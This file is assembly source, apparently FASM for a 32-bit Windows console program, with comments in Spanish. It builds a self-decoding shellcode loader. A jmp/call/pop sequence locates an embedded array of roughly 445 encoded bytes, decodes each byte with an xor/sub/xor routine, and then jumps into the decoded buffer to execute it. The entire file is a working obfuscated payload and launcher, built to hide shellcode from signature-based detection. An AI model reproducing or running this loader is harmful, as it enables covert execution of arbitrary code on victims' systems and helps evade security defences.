format PE console
use32
entry start

start:
        xor ecx, ecx
        xor edx, edx
        add dx, 0x01BC; size del shellcode 445 bytes o 0x01BD
        jmp mitexto

mifuncion4:
        pop ebx

mifuncion2:
        cmp edx, ecx
        jz mifuncion3; si ha acabado de decodear salta y ejecuta el shellcode

        xor eax, eax
        add al, BYTE [ebx+ecx]; cogemos el byte en la posicion esi+ecx

        ;ahora realizamos el decoding, que es el encoding pero a la inversa
        xor al, 0x29
        sub al, 0x06
        xor al, 0x43


        lea edi, [ebx+ecx]
        mov BYTE [edi], al; ponemos el byte original al shellcode
        inc ecx; incrementamos ecx para coger el siguiente byte

        jmp mifuncion2

mifuncion3:
        jmp ebx

mitexto:
        call mifuncion4
        mitextoescrito: db 0x35,0xf9,0x85,0xef,0x9c,0x58,0x51,0xb9,0x4,0xe7,0x9,0x50,0xe7,0x37,0x7c,0xe7,0x37,0x74,0xe7,0x77,0xe7,0x77,0xe7,0x37,0x70,0xf9,0xd,0xec,0xe7,0x2f,0xac,0x61,0x88,0xe7,0x20,0x68,0x61,0x88,0xe7,0x30,0x4c,0x61,0xb6,0xf9,0x35,0xe8,0xe7,0x68,0x40,0x61,0x8b,0xf9,0x6d,0x94,0xe7,0x10,0x44,0x61,0x8a,0xf9,0x15,0x90,0x51,0x92,0x32,0x18,0x1e,0x5,0x1f,0x1f,0x18,0xf,0x21,0x4,0x4,0x18,0x14,0x30,0x1e,0x1b,0x2,0x2a,0x23,0x5,0x2,0x32,0xf9,0x5,0x9c,0x51,0xa0,0xe7,0x6d,0x94,0xe7,0x15,0x9c,0x51,0xb9,0xec,0xe7,0xac,0xe3,0x61,0x8b,0x2,0xef,0xa1,0x7b,0x9f,0xc2,0x14,0x6f,0x20,0x87,0x83,0xe7,0x35,0x90,0xe7,0x3d,0xe8,0x51,0x92,0x2,0xe7,0x54,0x2e,0xe7,0x74,0xd1,0x61,0xb6,0xf9,0x35,0x98,0x51,0xb9,0x31,0x18,0x1,0x1e,0x69,0x21,0x18,0x3c,0x19,0xe,0x1e,0x18,0x3c,0x1b,0x1,0x4,0x34,0x3f,0xeb,0xbe,0x51,0xb9,0x31,0x2,0x29,0x1c,0x1c,0x2,0x31,0x18,0x5f,0x5e,0x5a,0x4,0x18,0x13,0x1f,0x5e,0xb,0x34,0xeb,0xb0,0xf9,0x25,0x84,0x51,0xb9,0x31,0x2,0x29,0x15,0x10,0x2,0x31,0x18,0x14,0x1,0x1e,0x14,0x18,0x33,0x3f,0x21,0x3f,0x34,0x30,0xe7,0x35,0x98,0xeb,0xbe,0x51,0xb9,0x2,0x29,0xf0,0x61,0x59,0xbc,0x34,0x2,0x29,0x6e,0x6e,0x31,0xeb,0xb0,0x51,0xb9,0x31,0x2,0x29,0x14,0x21,0x2,0x31,0x18,0x1b,0xf,0x7,0x5,0x18,0x33,0x3f,0x21,0x3f,0x34,0xe7,0x3d,0x84,0x31,0xe7,0x3d,0x98,0xeb,0xb1,0x51,0xb9,0x31,0x31,0x31,0xd1,0x62,0x31,0xd1,0x61,0x31,0x21,0x31,0xeb,0xb0,0xf9,0x25,0x80,0x51,0xb9,0x31,0x18,0x5,0xf,0x14,0x1,0x2,0xef,0x1c,0x44,0x6f,0x1,0x18,0xf,0x1b,0x1a,0x1a,0x34,0xe7,0x3d,0x84,0x31,0xe7,0x3d,0x98,0xeb,0xb1,0x18,0xa0,0xd8,0x61,0xbe,0x51,0xb9,0x2,0x29,0x71,0xc,0x2,0x31,0x51,0xb9,0xe0,0xa1,0x6e,0x2,0x31,0xf9,0x8e,0x51,0xb9,0x6,0x70,0x3e,0xe7,0x3d,0x80,0x31,0xeb,0xb0,0x51,0xb9,0x31,0x2,0x29,0x1f,0x21,0x2,0x31,0x18,0x1b,0xf,0x5,0x1f,0x18,0x14,0x5,0x30,0x1e,0x18,0x2f,0x1e,0x5,0x1,0x34,0xe7,0x3d,0xec,0x31,0xe7,0x3d,0x98,0xeb,0xb1,0xf9,0x25,0x8c,0x18,0xf,0x1d,0x4,0x1,0x2,0xef,0x1c,0x44,0x6f,0x1,0xf9,0x81,0x51,0xbe,0xef,0x9c,0x70,0xf9,0x8f,0xe7,0x6d,0x80,0x33,0x33,0x33,0x3e,0x3e,0x51,0xa0,0x20,0xa1,0xa0,0x78,0x30,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x51,0xa0,0x64,0x24,0x30,0xf9,0x80,0x3f,0x30,0x3e,0x3e,0x3e,0x51,0xa0,0x20,0x30,0x3e,0x3e,0x31,0x3e,0xe7,0x3d,0x8c,0xeb,0xb1,0xf9,0x9c,0xd,0xaf